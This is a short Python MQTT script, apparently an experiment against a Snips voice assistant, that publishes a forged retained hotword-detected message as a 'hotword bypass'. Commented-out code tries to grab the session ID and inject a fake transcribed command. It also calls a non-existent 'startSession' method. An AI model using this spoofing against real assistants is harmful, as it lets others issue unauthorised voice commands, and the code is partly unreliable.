import paho.mqtt.client as mqtt
import re

# The callback for when the client receives a CONNACK response from the server.
sessionId = 0
sessionId_set = False
startedListening = False

def on_connect(client, userdata, flags, rc):
    #print("Connected with result code "+str(rc))

    # Subscribing in on_connect() means that if we lose the connection and
    # reconnect then subscriptions will be renewed.
    #client.subscribe("hermes/hotword/#")
    client.subscribe('hermes/hotword/default/#')
    client.subscribe('hermes/asr/#')
    #time.sleep(2)
    #client.publish('hermes/dialogueManager/startSession','Hello there')
    # Hotword bypass
    client.publish('hermes/hotword/default/detected','{"siteId":"default","modelId":"hey_snips","modelVersion":"hey_snips_3.1_2018-04-13T15:27:35_model_0019","modelType":"universal","currentSensitivity":0.5}', retain=True)
    #client.publish('hermes/asr/toggleOff')
    #client.publish('hermes/asr/stopListening')
    #print("Sent hotword")
    #client.publish('hermes/dialogManager/default/startSession','hello')
# The callback for when a PUBLISH message is received from the server.
def on_message(client, userdata, msg):
    print("Received message: {0} {1}".format(msg.topic, msg.payload))
    #print("Received message: {0}".format(msg.topic))

    # To bypass opening ANSWER
    # startedListening = 'textCaptured' in msg.topic
    # print(msg.topic)
    # print("startedListening: {}".format(startedListening))
    #
    # # To capture sessionId
    # has_id = '"sessionId"' in str(msg.payload)
    # #print("Has ID: {}".format(has_id))
    #
    # if startedListening:
    #     print("Publishing txtCaptured update with Retrieved sessionId: {}".format(sessionId))
    #     client.publish('hermes/asr/textCaptured', '{"text":"start lesson","likelihood":0.7031782,"tokens":[{"value":"start","confidence":0.92768437,"range_start":0,"range_end":5,"time":{"start":0.0,"end":2.22}},{"value":"lesson","confidence":0.53300416,"range_start":6,"range_end":12,"time":{"start":2.221435,"end":3.36}}],"seconds":3.0,"siteId":"default","sessionId":"{0}"}'.format(sessionId))
    #     startedListening = False
    #
    # #print("--- BEYOND ID")
    # elif has_id and not sessionId_set:
    #     sessionId = re.search('(?<=sessionId":")[a-z,0-9,-]*', str(msg.payload))
    #     sessionId_set = True
        # Try to hijack text being captured
        #print("Stopping the listening real quick")
        #client.publish('hermes/asr/stopListening', '{"siteId":"default","sessionId":"{0}"}'.format(sessionId))

    #print(msg.topic+" "+str(msg.payload))
    # print("### BEYOND LISTENING")
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message

client.connect("snips-london-2.local", 1883, 60)
client.startSession()
# Blocking call that processes network traffic, dispatches callbacks and
# handles reconnecting.
# Other loop*() functions are available that give a threaded interface and a
# manual interface.
client.loop_forever()
